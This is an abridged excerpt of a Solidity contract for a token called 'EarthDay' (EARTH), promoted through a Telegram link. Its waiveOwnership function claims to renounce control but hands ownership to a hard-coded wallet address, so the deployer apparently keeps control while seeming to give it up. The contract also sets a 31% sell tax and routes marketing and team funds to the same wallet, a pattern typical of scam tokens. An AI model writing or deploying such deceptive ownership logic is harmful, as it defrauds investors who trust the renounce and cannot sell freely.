/**
Telegram : https://t.me/EarthDayMusk
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x4953c22eD865989D4E2Ae5F0DD1E56D9D6b8A5f6);
    }
...
contract EarthDay is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "EarthDay";
    string private _symbol = "EARTH";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x6406bb17d1983f1D5c04865378138c42a7F2cfFA);
    address payable public teamWalletAddress = payable(0x6406bb17d1983f1D5c04865378138c42a7F2cfFA);
    ...
    uint256 public _totalTaxIfSelling = 31;
